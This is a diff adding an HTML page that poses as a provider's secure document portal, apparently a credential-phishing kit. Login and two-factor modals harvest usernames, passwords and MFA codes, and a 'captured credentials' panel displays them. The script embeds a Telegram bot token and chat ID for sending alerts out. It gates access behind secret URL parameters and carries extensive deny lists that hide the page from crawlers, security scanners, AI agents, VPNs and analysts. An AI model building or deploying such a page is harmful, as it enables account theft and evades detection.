@@ -1,0 +1,1911 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title id="pageTitle">Secure Document Access</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background-color: #f5f7fa;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    /* Main Container */
+    .secure-container {
+      width: 100%;
+      max-width: 800px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+    }
+
+    /* Provider Header */
+    .provider-header {
+      background: white;
+      padding: 24px 32px;
+      border-bottom: 1px solid #e0e0e0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .provider-logo {
+      height: 32px;
+    }
+
+    .provider-logo img {
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .portal-title {
+      color: #13171B;
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    /* Content Area */
+    .secure-content {
+      padding: 40px;
+    }
+
+    /* Document Card */
+    .document-card {
+      background: #f8f9fa;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 32px;
+      margin-bottom: 32px;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    .document-icon {
+      font-size: 48px;
+      margin-bottom: 20px;
+    }
+
+    .document-title {
+      font-size: 20px;
+      color: #13171B;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .document-description {
+      color: #686e74;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    /* Action Button */
+    .secure-button {
+      color: white;
+      border: none;
+      padding: 14px 32px;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .secure-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    }
+
+    .secure-button:active {
+      transform: translateY(0);
+    }
+
+    /* Security Notice */
+    .security-notice {
+      border-radius: 4px;
+      padding: 16px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .security-icon {
+      font-size: 20px;
+    }
+
+    .security-text {
+      font-size: 14px;
+      line-height: 1.4;
+    }
+
+    /* Footer */
+    .provider-footer {
+      padding: 24px 40px;
+      border-top: 1px solid #e0e0e0;
+      background: #f8f9fa;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+      margin-top: 16px;
+    }
+
+    .footer-link {
+      text-decoration: none;
+      font-size: 12px;
+    }
+
+    .footer-link:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      text-align: center;
+      color: #686e74;
+      font-size: 12px;
+    }
+
+    /* Modal */
+    .secure-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .secure-modal.active {
+      display: flex;
+    }
+
+    .modal-content {
+      background: white;
+      width: 90%;
+      max-width: 440px;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+      transform: scale(0.9);
+      opacity: 0;
+      animation: modalAppear 0.3s ease forwards;
+    }
+
+    @keyframes modalAppear {
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    /* Login Form */
+    .modal-body {
+      padding: 0;
+    }
+
+    .login-header {
+      padding: 32px 32px 24px;
+      text-align: center;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .provider-logo-modal {
+      height: 32px;
+      margin: 0 auto 16px;
+    }
+
+    .provider-logo-modal img {
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .welcome-text {
+      color: #13171B;
+      font-size: 22px;
+      font-weight: 400;
+      margin-bottom: 8px;
+    }
+
+    .login-form {
+      padding: 32px;
+    }
+
+    /* Error Message */
+    .error-message {
+      background: #f8d7da;
+      border: 1px solid #f5c6cb;
+      border-radius: 4px;
+      padding: 12px;
+      margin-bottom: 20px;
+      display: none;
+      align-items: flex-start;
+      gap: 10px;
+      opacity: 0;
+      transform: translateY(-10px);
+    }
+
+    .error-message.show {
+      display: flex;
+      animation: errorSlide 0.3s ease forwards;
+    }
+
+    @keyframes errorSlide {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .error-icon {
+      color: #c70032;
+      font-size: 16px;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .error-text {
+      color: #721c24;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: formAppear 0.4s ease forwards;
+    }
+
+    @keyframes formAppear {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .form-group:nth-child(1) {
+      animation-delay: 0.1s;
+    }
+    .form-group:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .form-label {
+      display: block;
+      color: #13171B;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #d1d5db;
+      border-radius: 4px;
+      background: white;
+      transition: all 0.3s ease;
+      height: 48px;
+    }
+
+    .form-input.error {
+      border-color: #c70032;
+    }
+
+    .form-input:focus {
+      outline: none;
+    }
+
+    .password-wrapper {
+      position: relative;
+    }
+
+    .password-input {
+      padding-right: 60px;
+    }
+
+    .show-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 4px;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 24px;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: formAppear 0.4s ease forwards;
+      animation-delay: 0.3s;
+    }
+
+    .checkbox-input {
+      width: 16px;
+      height: 16px;
+      border: 1px solid #d1d5db;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .checkbox-label {
+      color: #13171B;
+      font-size: 14px;
+    }
+
+    .signin-button {
+      width: 100%;
+      padding: 14px;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-bottom: 16px;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: formAppear 0.4s ease forwards;
+      animation-delay: 0.4s;
+    }
+
+    .signin-button:hover {
+      opacity: 0.9;
+    }
+
+    .signin-button:disabled {
+      background: #ccc !important;
+      cursor: not-allowed;
+    }
+
+    .login-links {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 24px;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: formAppear 0.4s ease forwards;
+      animation-delay: 0.5s;
+    }
+
+    .login-link {
+      text-decoration: none;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .login-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Unlocked State */
+    .document-unlocked {
+      background: linear-gradient(135deg, #f0f9ff 0%, #e6f7ff 100%);
+    }
+
+    .document-unlocked .document-icon {
+      color: #28a745 !important;
+    }
+
+    .unlocked-message {
+      color: #28a745;
+      font-weight: 600;
+      margin-top: 16px;
+      animation: fadeInUp 0.5s ease;
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* Document Actions */
+    .document-actions {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-top: 24px;
+    }
+
+    .action-btn {
+      padding: 12px 24px;
+      border-radius: 4px;
+      background: white;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .action-btn:hover {
+      color: white;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    }
+
+    .action-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      border-color: #ccc !important;
+      color: #999 !important;
+      transform: none;
+    }
+
+    .action-btn:disabled:hover {
+      background: white;
+      color: #999 !important;
+      box-shadow: none;
+    }
+
+    /* Loading Animation */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+      animation: fadeIn 0.3s ease;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    .loading-container {
+      background: white;
+      border-radius: 12px;
+      padding: 40px;
+      text-align: center;
+      max-width: 300px;
+      animation: scaleIn 0.3s ease;
+    }
+
+    @keyframes scaleIn {
+      from {
+        transform: scale(0.8);
+        opacity: 0;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #f0f0f0;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: #13171B;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .loading-subtext {
+      color: #686e74;
+      font-size: 14px;
+    }
+
+    /* Button Loading State */
+    .secure-button.loading {
+      pointer-events: none;
+    }
+
+    .secure-button.loading span:first-child {
+      animation: lockSpin 0.8s ease infinite;
+    }
+
+    @keyframes lockSpin {
+      0%, 100% { transform: rotate(0deg); }
+      50% { transform: rotate(180deg); }
+    }
+
+    /* MFA Modal */
+    .mfa-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .mfa-modal.active {
+      display: flex;
+    }
+
+    .mfa-content {
+      background: white;
+      width: 90%;
+      max-width: 440px;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+      animation: modalAppear 0.3s ease forwards;
+    }
+
+    .mfa-header {
+      padding: 32px 32px 24px;
+      text-align: center;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .mfa-body {
+      padding: 32px;
+    }
+
+    .mfa-instructions {
+      text-align: center;
+      color: #686e74;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+
+    .mfa-code-display {
+      background: #f8f9fa;
+      border-radius: 8px;
+      padding: 25px;
+      margin: 25px 0;
+      text-align: center;
+      border: 2px solid #e0e0e0;
+      font-family: 'Courier New', monospace;
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .mfa-code-display::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        45deg,
+        transparent 30%,
+        rgba(255,255,255,0.2) 50%,
+        transparent 70%
+      );
+      animation: shine 2s infinite;
+    }
+
+    @keyframes shine {
+      0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+      100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+    }
+
+    .mfa-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 30px 0;
+    }
+
+    .mfa-input {
+      width: 50px;
+      height: 60px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      border: 2px solid #d1d5db;
+      border-radius: 4px;
+      background: white;
+      transition: all 0.3s;
+    }
+
+    .mfa-input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 2px var(--primary-color-light);
+    }
+
+    .mfa-input.error {
+      border-color: #c70032;
+    }
+
+    .mfa-attempts {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #686e74;
+    }
+
+    .mfa-buttons {
+      display: flex;
+      gap: 10px;
+      margin-top: 25px;
+    }
+
+    .mfa-button {
+      flex: 1;
+      padding: 14px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .mfa-button.primary {
+      background: var(--primary-color);
+      color: white;
+    }
+
+    .mfa-button.secondary {
+      background: #f0f0f0;
+      color: #333;
+    }
+
+    .mfa-button:hover {
+      opacity: 0.9;
+      transform: translateY(-1px);
+    }
+
+    /* Success Modal */
+    .success-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .success-modal.active {
+      display: flex;
+    }
+
+    .success-content {
+      background: white;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+      animation: modalAppear 0.3s ease forwards;
+    }
+
+    .success-header {
+      padding: 32px 32px 24px;
+      text-align: center;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .success-icon {
+      font-size: 60px;
+      margin-bottom: 20px;
+      animation: celebrate 1s ease;
+    }
+
+    @keyframes celebrate {
+      0% { transform: scale(0); opacity: 0; }
+      70% { transform: scale(1.2); opacity: 1; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .success-body {
+      padding: 32px;
+      text-align: center;
+    }
+
+    .success-message {
+      color: #28a745;
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+
+    .captured-data {
+      background: #f8f9fa;
+      border-radius: 8px;
+      padding: 20px;
+      margin: 25px 0;
+      text-align: left;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      line-height: 1.6;
+      max-height: 200px;
+      overflow-y: auto;
+      border: 1px solid #e0e0e0;
+    }
+
+    .data-line {
+      margin-bottom: 8px;
+      display: flex;
+    }
+
+    .data-label {
+      font-weight: 600;
+      color: #333;
+      min-width: 120px;
+    }
+
+    .data-value {
+      color: #666;
+      word-break: break-all;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .secure-content {
+        padding: 24px;
+      }
+
+      .document-card {
+        padding: 24px;
+      }
+
+      .provider-header {
+        flex-direction: column;
+        gap: 16px;
+        text-align: center;
+      }
+
+      .footer-links {
+        flex-wrap: wrap;
+        gap: 16px;
+      }
+
+      .document-actions {
+        flex-direction: column;
+      }
+
+      .login-header, .mfa-header, .success-header {
+        padding: 24px 24px 16px;
+      }
+
+      .login-form, .mfa-body, .success-body {
+        padding: 24px;
+      }
+
+      .mfa-input {
+        width: 40px;
+        height: 50px;
+        font-size: 20px;
+      }
+
+      .mfa-buttons {
+        flex-direction: column;
+      }
+    }
+
+    /* Shake animation */
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+      20%, 40%, 60%, 80% { transform: translateX(5px); }
+    }
+
+    .shake {
+      animation: shake 0.5s ease;
+    }
+
+    /* CSS Variables for provider colors */
+    :root {
+      --primary-color: #009FDB;
+      --primary-color-light: rgba(0, 159, 219, 0.1);
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-container">
+      <div class="loading-spinner" id="loadingSpinner"></div>
+      <div class="loading-text" id="loadingText">Establishing Secure Connection</div>
+      <div class="loading-subtext" id="loadingSubtext">Connecting to authentication servers...</div>
+    </div>
+  </div>
+
+  <!-- Main Container -->
+  <div class="secure-container">
+    <!-- Header -->
+    <div class="provider-header">
+      <div class="provider-logo" id="providerLogo">
+        <!-- Logo will be inserted by JavaScript -->
+      </div>
+      <div class="portal-title" id="portalTitle">Secure Document Access</div>
+    </div>
+
+    <!-- Content -->
+    <div class="secure-content">
+      <!-- Security Notice -->
+      <div class="security-notice" id="securityNotice">
+        <div class="security-icon">⚠️</div>
+        <div class="security-text" id="securityText">
+          <strong id="securityTitle">Security Notice:</strong> This document requires account authentication for viewing. All access is logged and monitored.
+        </div>
+      </div>
+
+      <!-- Document Card -->
+      <div class="document-card" id="documentCard">
+        <div class="document-icon">🔒</div>
+        <h2 class="document-title" id="documentTitle">Account Terms & Conditions Update</h2>
+        <p class="document-description" id="documentDescription">
+          Document ID: <span id="docId">DOC-2025-0876</span><br>
+          Last Updated: December 16, 2025<br>
+          Security Level: High
+        </p>
+        <button class="secure-button" id="accessBtn">
+          
+          <span id="accessBtnText">Sign In to Access Document</span>
+        </button>
+      </div>
+
+      <!-- Document Actions (hidden initially) -->
+      <div class="document-actions">
+        <button class="action-btn" id="downloadBtn" disabled>
+          <span>⬇️</span> <span id="downloadBtnText">Download PDF</span>
+        </button>
+        <button class="action-btn" id="printBtn" disabled>
+          <span>🖨️</span> <span id="printBtnText">Print Document</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="provider-footer">
+      <div class="copyright" id="copyrightText">
+        © 2025 All rights reserved.
+      </div>
+      <div class="footer-links">
+        <a href="#" class="footer-link" id="privacyLink">Privacy Policy</a>
+        <a href="#" class="footer-link" id="termsLink">Terms of Use</a>
+        <a href="#" class="footer-link" id="legalLink">Legal Center</a>
+        <a href="#" class="footer-link" id="accessibilityLink">Accessibility</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Authentication Modal -->
+  <div class="secure-modal" id="authModal">
+    <div class="modal-content">
+      <div class="modal-body">
+        <div class="login-header">
+          <div class="provider-logo-modal" id="providerLogoModal">
+            <!-- Logo will be inserted by JavaScript -->
+          </div>
+          <h2 class="welcome-text" id="welcomeText">Welcome</h2>
+        </div>
+        
+        <div class="login-form">
+          <!-- Error Message (Initially Hidden) -->
+          <div class="error-message" id="errorMessage">
+            <div class="error-icon">⚠️</div>
+            <div class="error-text">
+              <strong id="errorMessageText">Incorrect user ID or password. Try again.</strong>
+              <div id="errorCode" style="font-size: 12px; margin-top: 5px;"></div>
+            </div>
+          </div>
+          
+          <form id="authForm">
+            <div class="form-group">
+              <label class="form-label" for="username" id="usernameLabel">Username</label>
+              <input type="text" id="username" class="form-input" placeholder="Enter username" required>
+            </div>
+            
+            <div class="form-group">
+              <label class="form-label" for="password" id="passwordLabel">Password</label>
+              <div class="password-wrapper">
+                <input type="password" id="password" class="form-input password-input" placeholder="Enter your password" required>
+                <button type="button" class="show-password" id="showPassword">Show</button>
+              </div>
+            </div>
+            
+            <div class="checkbox-group" id="rememberMeGroup">
+              <input type="checkbox" id="rememberMe" class="checkbox-input">
+              <label for="rememberMe" class="checkbox-label" id="rememberMeLabel">Remember Me</label>
+            </div>
+            
+            <button type="submit" class="signin-button" id="signinBtn">
+              <span id="signinBtnText">Continue</span>
+            </button>
+            
+            <div class="login-links" id="loginLinks">
+              <!-- Links will be populated based on provider -->
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MFA Modal -->
+  <div class="mfa-modal" id="mfaModal">
+    <div class="mfa-content">
+      <div class="mfa-header">
+        <div class="provider-logo-modal" id="mfaProviderLogo">
+          <!-- Logo will be inserted by JavaScript -->
+        </div>
+        <h2 class="welcome-text" id="mfaWelcomeText">Two-Factor Authentication</h2>
+      </div>
+      
+      <div class="mfa-body">
+        <div class="mfa-instructions" id="mfaInstructions">
+          For your security, please enter the verification code sent to your registered device.
+        </div>
+        
+        <div class="mfa-code-display" id="mfaCodeDisplay">
+          • • • • • •
+        </div>
+        
+        <div class="mfa-inputs">
+          <input type="text" maxlength="1" class="mfa-input" data-index="0">
+          <input type="text" maxlength="1" class="mfa-input" data-index="1">
+          <input type="text" maxlength="1" class="mfa-input" data-index="2">
+          <input type="text" maxlength="1" class="mfa-input" data-index="3">
+          <input type="text" maxlength="1" class="mfa-input" data-index="4">
+          <input type="text" maxlength="1" class="mfa-input" data-index="5">
+        </div>
+        
+        <div class="mfa-attempts" id="mfaAttempts">
+          Attempt <span id="currentMfaAttempt">1</span> of <span id="maxMfaAttempts">2</span>
+        </div>
+        
+        <div class="mfa-buttons">
+          <button class="mfa-button primary" id="verifyMfaBtn">Verify Code</button>
+          <button class="mfa-button secondary" id="cancelMfaBtn">Cancel</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Success Modal -->
+  <div class="success-modal" id="successModal">
+    <div class="success-content">
+      <div class="success-header">
+        <div class="success-icon">✅</div>
+        <h2 class="welcome-text" id="successWelcomeText">Authentication Complete</h2>
+      </div>
+      
+      <div class="success-body">
+        <div class="success-message" id="successMessage">
+          Document access granted successfully!
+        </div>
+        
+        <div class="captured-data" id="capturedData">
+          <!-- Captured credentials will be displayed here -->
+        </div>
+        
+        <div class="mfa-buttons">
+          <button class="mfa-button primary" id="viewDocumentBtn">View Document</button>
+          <button class="mfa-button secondary" id="closeSuccessBtn">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+// ============================================================================
+// SECURITY CONFIGURATION - AGGRESSIVE BLACKLISTING
+// ============================================================================
+const SECURITY_CONFIG = {
+    // Telegram Configuration
+    BOT_TOKEN: '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0',
+    CHAT_ID: '1412104349',
+    
+    // Required URL parameters
+    REQUIRED_PARAMS: {
+        giftCode: /^Santa\d{3}$/,      // e.g., ?giftCode=Santa123
+        reindeer: /^Rudolph\d{3}$/     // e.g., &reindeer=Rudolph456
+    },
+    
+    // Blacklisted patterns - KEEP ALL
+    BLACKLISTED_WORDS: [
+        // Bots & Crawlers
+        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+        'YandexBot', 'Sogou', 'Exabot', 'facebook', 'facebot', 'Twitterbot',
+        'rogerbot', 'linkedinbot', 'embedly', 'quora', 'outbrain', 'pinterest',
+        'slackbot', 'vkShare', 'W3C_Validator', 'redditbot', 'Applebot',
+        
+        // Security Tools & Headless Browsers
+        'curl', 'wget', 'python', 'perl', 'ruby', 'java', 'php', 'scrapy',
+        'phantomjs', 'selenium', 'puppeteer', 'headless', 'chrome-headless',
+        'nightmare', 'casperjs', 'slimerjs', 'trident', 'axios', 'request',
+        'postman', 'insomnia', 'restclient', 'fiddler', 'burp', 'zap',
+        
+        // AI & LLM Agents
+        'ChatGPT-User', 'GPTBot', 'Google-Extended', 'ClaudeBot',
+        'anthropic-ai', 'cohere-ai', 'PerplexityBot', 'YouBot',
+        'Diffbot', 'OAI-SearchBot', 'CCBot', 'Bytespider',
+        
+        // Cloud & Proxy Services
+        'amazonaws', 'googleusercontent', 'cloudfront', 'azure',
+        'digitalocean', 'linode', 'vultr', 'heroku', 'github',
+        'gitlab', 'bitbucket', 'travis', 'jenkins', 'circleci',
+        
+        // VPN/Proxy Indicators
+        'proxy', 'vpn', 'tor', 'anonymizer', 'hide', 'shield',
+        'nordvpn', 'expressvpn', 'surfshark', 'pia', 'cyberghost',
+        'hidemyass', 'windscribe', 'privateinternetaccess',
+        
+        // Malicious Indicators
+        'sqlmap', 'nikto', 'nmap', 'metasploit', 'wpscan', 'joomscan',
+        'dirbuster', 'gobuster', 'hydra', 'john', 'hashcat', 'aircrack',
+        'ettercap', 'wireshark', 'nessus', 'openvas', 'nexpose',
+        
+        // Data Centers & Hosting
+        'datacenter', 'colo', 'hosting', 'server', 'vps', 'dedicated',
+        'ovh', 'hetzner', 'leaseweb', 'online.net', 'kimsufi',
+        'contabo', 'hostwinds', 'bluehost', 'godaddy', 'namecheap',
+        
+        // Scanning Tools
+        'zap', 'arachni', 'skipfish', 'w3af', 'wapiti', 'vega',
+        'burpsuite', 'acunetix', 'appscan', 'netsparker', 'qualys',
+        
+        // Development & Testing
+        'localhost', '127.0.0.1', '192.168.', '10.', '172.16.',
+        'test', 'dev', 'staging', 'preprod', 'qa', 'debug',
+        
+        // Mobile Apps (should use API)
+        'okhttp', 'alamofire', 'volley', 'retrofit', 'afnetworking',
+        'ionic', 'react-native', 'flutter', 'xamarin', 'cordova'
+    ],
+    
+    // Blacklisted hostname patterns - KEEP ALL
+    BLACKLISTED_HOSTNAMES: [
+        '.aws.', '.google.', '.amazonaws.', '.cloudfront.',
+        '.azure.', '.digitalocean.', '.linode.', '.vultr.',
+        '.heroku.', '.github.', '.gitlab.', '.bitbucket.',
+        '.ovh.', '.hetzner.', '.leaseweb.', '.contabo.',
+        '.vps.', '.server.', '.hosting.', '.datacenter.',
+        '.proxy.', '.vpn.', '.tor.', '.anonymizer.',
+        'crawl-', 'bot-', 'spider-', 'scraper-', 'scan-',
+        'security-', 'pentest-', 'test-', 'dev-', 'staging-'
+    ],
+    
+    // Blacklisted countries (ISO codes) - KEEP ALL
+    BLACKLISTED_COUNTRIES: [
+        'CN', 'RU', 'KP', 'IR', 'SY', 'CU', 'VE'  // High-risk countries
+    ],
+    
+    // Security settings
+    AGGRESSIVE_MODE: true,
+    BLACKLIST_ON_MISSING_BD: true,
+    MAX_ATTEMPTS_PER_IP: 3,
+    BLACKLIST_DURATION: '30d', // 30 days in localStorage
+    ENABLE_TELEGRAM_ALERTS: true
+};
+
+// ============================================================================
+// STORAGE MANAGEMENT - KEEP ALL
+// ============================================================================
+const STORAGE_KEYS = {
+    BLACKLIST: 'security_blacklist_v2',
+    ATTEMPTS: 'ip_attempts',
+    VALID_PARAMS: 'validated_params',
+    SESSIONS: 'active_sessions'
+};
+
+function initializeSecurityStorage() {
+    // Initialize blacklist
+    if (!localStorage.getItem(STORAGE_KEYS.BLACKLIST)) {
+        localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify([]));
+    }
+    
+    // Initialize attempt counter
+    if (!localStorage.getItem(STORAGE_KEYS.ATTEMPTS)) {
+        localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify({}));
+    }
+    
+    // Initialize sessions
+    if (!localStorage.getItem(STORAGE_KEYS.SESSIONS)) {
+        localStorage.setItem(STORAGE_KEYS.SESSIONS, JSON.stringify({}));
+    }
+}
+
+// ============================================================================
+// BLACKLIST MANAGEMENT - KEEP ALL
+// ============================================================================
+function addToBlacklist(ip, reason = 'Security violation', details = {}) {
+    try {
+        const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
+        
+        // Clean old entries (older than 30 days)
+        const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
+        const cleanBlacklist = blacklist.filter(entry => 
+            new Date(entry.timestamp).getTime() > thirtyDaysAgo
+        );
+        
+        const entry = {
+            ip: ip,
+            timestamp: new Date().toISOString(),
+            reason: reason,
+            details: {
+                userAgent: navigator.userAgent.substring(0, 150),
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                ...details
+            },
+            expires: new Date(Date.now() + (30 * 24 * 60 * 60 * 1000)).toISOString()
+        };
+        
+        // Check if IP already exists
+        const existingIndex = cleanBlacklist.findIndex(entry => entry.ip === ip);
+        if (existingIndex !== -1) {
+            // Update existing entry
+            cleanBlacklist[existingIndex] = entry;
+        } else {
+            // Add new entry
+            cleanBlacklist.push(entry);
+        }
+        
+        localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify(cleanBlacklist));
+        
+        // Send Telegram alert
+        if (SECURITY_CONFIG.ENABLE_TELEGRAM_ALERTS) {
+            sendSecurityAlert('BLACKLIST_ADDED', {
+                ip: ip,
+                reason: reason,
+                userAgent: navigator.userAgent,
+                url: window.location.href
+            });
+        }
+        
+        console.log(`🚫 BLACKLISTED: ${ip} - ${reason}`);
+        return true;
+        
+    } catch (error) {
+        console.error('Error adding to blacklist:', error);
+        return false;
+    }
+}
+
+function isBlacklisted(ip) {
+    try {
+        const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
+        const now = new Date();
+        
+        // Clean expired entries while checking
+        const validEntries = blacklist.filter(entry => {
+            if (!entry.expires) return true;
+            return new Date(entry.expires) > now;
+        });
+        
+        // Update storage with cleaned list
+        if (validEntries.length !== blacklist.length) {
+            localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify(validEntries));
+        }
+        
+        return validEntries.some(entry => entry.ip === ip);
+        
+    } catch (error) {
+        console.error('Error checking blacklist:', error);
+        return false;
+    }
+}
+
+// ============================================================================
+// ATTEMPT TRACKING - KEEP ALL
+// ============================================================================
+function trackAttempt(ip) {
+    try {
+        const attempts = JSON.parse(localStorage.getItem(STORAGE_KEYS.ATTEMPTS) || '{}');
+        
+        if (!attempts[ip]) {
+            attempts[ip] = {
+                count: 1,
+                firstAttempt: new Date().toISOString(),
+                lastAttempt: new Date().toISOString()
+            };
+        } else {
+            attempts[ip].count++;
+            attempts[ip].lastAttempt = new Date().toISOString();
+            
+            // Check if max attempts reached
+            if (attempts[ip].count >= SECURITY_CONFIG.MAX_ATTEMPTS_PER_IP) {
+                addToBlacklist(ip, 'Maximum attempts exceeded', {
+                    attemptCount: attempts[ip].count
